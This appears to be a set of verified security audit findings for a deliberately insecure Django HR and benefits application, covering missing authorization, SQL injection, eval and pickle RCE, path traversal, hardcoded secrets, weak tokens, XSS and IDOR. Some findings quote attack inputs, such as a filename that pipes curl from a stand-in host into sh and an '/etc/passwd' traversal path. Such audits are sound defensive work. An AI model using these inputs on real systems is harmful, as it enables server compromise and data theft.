extra.message: Missing authorization on admin endpoints (role check absent) — Any regular authenticated user can view/edit/delete any other user's account and view all users' data and analytics, effectively gaining full admin control over the application. [verified: Same decorator applies to all /admin/ routes; any authenticated user's auth_token passes the check, granting access to admin_update_user, admin_delete_user, admin_get_all_users, admin_get_user, and admin_analytics.]

Missing authorization on admin endpoints (any user can act as admin) — Any authenticated, non-admin user can enumerate, view, modify, or delete any other user's account via the admin views since no role check is enforced. [verified: decorators.py:8-13 confirms user_is_authenticated only checks that auth_token matches an existing User, with no is_admin/role check, and it guards admin_* views operating on arbitrary selected_id.]

SQL injection in admin analytics query — Attacker (any user reaching admin_analytics, which lacks role checks) can read/modify arbitrary database contents via SQL injection. [verified: table_name is fixed but col and ip are attacker-controlled and interpolated unescaped; access requires only @user_is_authenticated, not an admin permission check, so any authenticated user can exploit it.]

OS command injection via uploaded filename in backup copy — Authenticated user achieves arbitrary OS command execution on the server by uploading a file with a shell-metacharacter-laced name (e.g. `x; curl evil.sh|sh #.pdf`) and setting backup=true, leading to full server compromise. [verified: uploaded_file.name flows unsanitized into os.system("cp %s %s") at benefits.py:73 with no shell-metacharacter filtering or auth control beyond login, so an authenticated user can inject shell commands via a crafted filename with backup=true.]

Hardcoded backdoor admin auth token — Full authentication bypass / admin account takeover using a known static token [verified: user_data.py:41-42 hardcodes auth_token literally as the string "auth_token" for the seeded admin reviewer account, persisted via User.objects.create() in the seed flow (user.py:82-91). decorators.py and User.authenticate_by_token() grant full session auth to whoever presents a cookie auth_token matching this value in the DB, with no other check, so any client sending Cookie: auth_token=auth_token]

Admin views lack role/authorization check — Any authenticated non-admin user can delete, modify, or exfiltrate any other employee's account/PII via the admin endpoints. [verified: All listed admin_* views share the same decorator lacking an is_admin check, confirmed by reading decorators.py; any logged-in user can act on arbitrary selected_id.]

Mass assignment privilege escalation and missing admin authorization — Privilege escalation to admin and arbitrary modification/deletion of any user record [verified: Combines confirmed missing authz (no is_admin check in decorator) with confirmed mass assignment (unfiltered **data update), allowing any authenticated user to set is_admin=True or modify arbitrary users.]

Mass Assignment in Admin User Update — An authenticated user reaching this endpoint (already unauthorized per prior finding) can set arbitrary fields including is_admin=True to self-escalate privileges. [verified: admin_update_user applies request.POST.dict() via .update(**data) with only password/password_confirmation stripped; is_admin and other fields pass through unfiltered, enabling self-escalation.]

Missing authorization (role check) on admin routes — Privilege escalation — any regular employee account can access admin-only analytics and the full user table, and chain into the SQL injection above [verified: admin_analytics and admin_get_all_users use the same non-role-checking decorator, exposing full user listing and the SQL-injectable analytics endpoint to any authenticated user.]

eval() on User-Controlled Class Name in Mobile API — Unauthenticated arbitrary code execution and full dump of any database model (e.g. all users, password hashes, tokens) via ?class=<name>. [verified: eval(classname) executes arbitrary Python from the unauthenticated 'class' GET parameter (only @require_http_methods GET is applied, no auth/permission check), enabling RCE or dumping any model like User with password hashes.]

Forgeable static-salt API bearer token allows impersonation of arbitrary user — Attacker who obtains the shared ACCESS_TOKEN_SALT can mint valid tokens for any user_id and read arbitrary users' PII via the API, including becoming the admin branch if user_id belongs to an admin. [verified: check_if_valid_token trusts a client-supplied user_id combined with a single static salt; extrapolate_user then uses that same attacker-controlled id to fetch full user records in api_index/api, including the admin branch, enabling PII disclosure and admin impersonation.]

Insecure Deserialization in Password Reset — Remote code execution on the server by supplying a malicious pickle payload in the 'user' POST field during password reset. [verified: reset_password (line 84) calls pickle.loads on a client-supplied, unauthenticated base64 'user' POST field with no signing/verification, enabling arbitrary object deserialization/RCE.]

Path Traversal in Benefit Form Download — Any authenticated user can read arbitrary files on the server filesystem (e.g. ../../../../etc/passwd or Django settings/secret files). [verified: path is BASE_DIR + unsanitized 'name' GET param with no normalization/whitelist and only @user_is_authenticated (no ownership check); attacker can traverse to arbitrary files like ../../../../etc/passwd.]

SQL injection and IDOR in user_view via raw SQL string interpolation — Arbitrary SQL execution and cross-user data access/account takeover [verified: Same raw SQL interpolation confirmed at line 75-76; @user_is_authenticated only checks a cookie exists (no ownership check), so any authenticated user can inject SQL or target another user's record.]

Hardcoded API Token Salt in Settings — Attacker forges valid API auth tokens for any user, enabling account impersonation [verified: ACCESS_TOKEN_SALT is hardcoded and publicly visible in source, and check_if_valid_token computes token validity purely as SHA(salt:group_id) with no server-side secret or per-user unpredictable component, so anyone can compute a valid Authorization token for any user_id and access/impersonate arbitrary users via api_index/api.]

Path traversal on benefit form upload (arbitrary file write) — Authenticated attacker can write/overwrite arbitrary files on the server (e.g. planting a web-accessible script for RCE, corrupting app files) [verified: uploaded_file.name is joined directly into full_file_name via os.path.join with no path traversal sanitization before default_storage.save() writes there, allowing '../' sequences to escape the data directory.]

Weak password hashing (unsalted MD5) — If the database is compromised, attacker can crack password hashes rapidly using rainbow tables/GPU brute force due to MD5's speed and lack of salting. [verified: hash_password() at line 132-134 uses unsalted hashlib.md5 for password storage with no salt or iteration, confirmed in code.]

Weak password hashing and predictable session token generation — Password cracking via MD5 rainbow tables and session hijacking via brute-forced/predicted auth tokens [verified: authenticate() uses unsalted MD5 for password compare (line 107) and generate_token() uses random.randint over 1M values with MD5 (line 141), both confirmed with no mitigations.]

Predictable, low-entropy auth token generation — An attacker who knows or guesses a user's email can brute-force the auth_token (only ~1M candidates) and authenticate as that user via authenticate_by_token, achieving full account takeover. [verified: generate_token() uses non-cryptographic random.randint(1,1000000) combined with email and MD5, and authenticate_by_token() performs a direct lookup with no rate limiting, making brute-force account takeover feasible.]

Predictable session token generation — Attacker can brute-force or predict a victim's auth_token and hijack their session without credentials [verified: generate_token() derives auth_token from MD5(email+random.randint(1,1000000)) using Python's non-CSPRNG random module, and authenticate_by_token is the sole check used for token-based auth, enabling brute force/prediction.]

Stored XSS via mark_safe on User first_name — A user can register with a first_name containing a <script> payload that executes in the browser of anyone who views a page rendering safe_name (including admins), enabling session/token theft. [verified: safe_name() wraps first_name in mark_safe with no sanitization, and first_name is attacker-controlled at signup (no validation seen in validate_signup_form); rendering it unescaped enables stored XSS.]

Hardcoded global AES encryption key for sensitive PII — Any party who obtains the source (or the leaked constant) can decrypt every user's encrypted sensitive data (SSNs, pay/retirement records) at rest, defeating the confidentiality the encryption is meant to provide. [verified: settings.KEY is a hardcoded static AES key checked into source and used as the sole encryption key for all users' sensitive data via Encryption.get_key(); only the IV is per-user, so anyone with source access can decrypt any ciphertext.]

Missing Authorization on Mobile/User API Endpoint — Attacker who forges a token (via known hardcoded salt) can access another user's API data without further authorization checks [verified: api() derives user_id solely from a client-supplied token validated against a hardcoded, source-visible salt (ACCESS_TOKEN_SALT) with a trivially forgeable HMAC-less SHA check, then returns that user's data with no session/ownership check tying it to the requester; id_number path param is unused.]

Forgeable API Auth Token via Hardcoded Salt and Broken Regex — Attacker can forge a valid Authorization token for an arbitrary group_id/user by computing SHA1(hardcoded_salt:id), bypassing API authentication. [verified: ACCESS_TOKEN_SALT is a static hardcoded value and the token is user_id-SHA1(salt:user_id), so anyone knowing the salt can forge tokens for any user_id; the regex is also broken but the core issue is the forgeable static-salt hash.]

Forgeable API auth token via hardcoded salt — Impersonation of any user (including admins) on the mobile/user API by forging tokens [verified: group_hash = SHA1(ACCESS_TOKEN_SALT + ':' + group_id) at line 60 uses a hardcoded salt from settings.py with no per-user secret, so anyone with the salt can compute valid tokens for arbitrary user_id/group_id.]

Predictable Password Reset Token — An attacker who knows or guesses a user's email and user_id can forge a valid password-reset token and take over the account. [verified: generate_token/is_valid_token derive the token solely from user_id+MD5(email) with no server secret and compare with '==' (non-constant-time); anyone knowing/guessing the email can forge a valid token.]

Predictable password-reset token using unsalted MD5 of email — Account takeover via forged password reset token without needing the emailed link [verified: generate_token (lines 44-47) is deterministic from email alone; combined with reset_password's pickle sink, an attacker can compute a token without ever receiving the emailed link.]

Forgeable password reset token (no secret/expiry) — Account takeover via crafted password-reset token for any known user, including admins [verified: Token has no server-side secret, salt, or expiry — is_valid_token only recomputes MD5(email) and compares, so a forged token works indefinitely for any known email.]

Message Sender Spoofing via Unchecked creator_id — Attacker can forge messages appearing to originate from any other user [verified: user_messages takes creator_id straight from POST and fetches that User with no check against the authenticated current_user, and @user_is_authenticated only checks session login, not identity match, so any logged-in user can forge messages as anyone.]

IDOR on Private Messages — Any authenticated user can read or delete another user's private internal messages by guessing/iterating message_id. [verified: user_message() fetches Message.objects.get(pk=message_id) with only authentication (not ownership) required via user_is_authenticated, and returns/deletes it with no creator/receiver check on request.user.]

IDOR allows deleting arbitrary users' pay records — Any authenticated user can delete another user's direct-deposit/pay record by guessing/enumerating pay_id. [verified: Pay.objects.get(id=pay_id).delete() has no ownership check, allowing any authenticated user to delete arbitrary pay records by ID.]

IDOR in Work Info View — Any authenticated user can view another employee's work_info by changing the user_id path parameter. [verified: user_is_authenticated only verifies the auth_token cookie belongs to some existing user, never comparing it to the user_id path parameter; the view then loads User.objects.get(id=user_id) directly from the URL, allowing any authenticated user to view another employee's work_info.]

Insecure Django Settings (DEBUG/ALLOWED_HOSTS/SECRET_KEY) — DEBUG=True leaks stack traces/source and settings on error pages; ALLOWED_HOSTS=['*'] permits Host header attacks; a checked-in SECRET_KEY lets attackers forge signed cookies/tokens. [verified: DEBUG=True, ALLOWED_HOSTS=['*'], and a hardcoded SECRET_KEY are all present in settings.py:22-27 with no environment override, matching the threat model's trusted-config caveat only for intended values, not insecure defaults.]

Missing rate limiting / brute-force protection on login — Attacker can perform unlimited password-guessing/credential-stuffing attempts against any account. [verified: authenticate() has no lockout/backoff/CAPTCHA and the view has no throttling decorator, permitting unlimited credential-guessing attempts.]

Open Redirect on Login — Attacker crafts a login link with an external 'path' value to redirect authenticated users to an attacker-controlled phishing site post-login. [verified: path is taken directly from POST and passed unvalidated to HttpResponseRedirect with no host/scheme check.]

Open redirect via unchecked POST 'path' parameter — Attacker can redirect authenticated users to an attacker-controlled site for phishing after login [verified: Duplicate of finding 0 — same unchecked POST 'path' used in HttpResponseRedirect(path) at line 43.]

User Enumeration via Login Error Messages — Attacker can enumerate valid registered email addresses by observing differing error messages, aiding targeted credential attacks. [verified: User.DoesNotExist vs generic exception produces distinct 'Email incorrect!' vs 'Password incorrect!' messages, enabling account enumeration.]
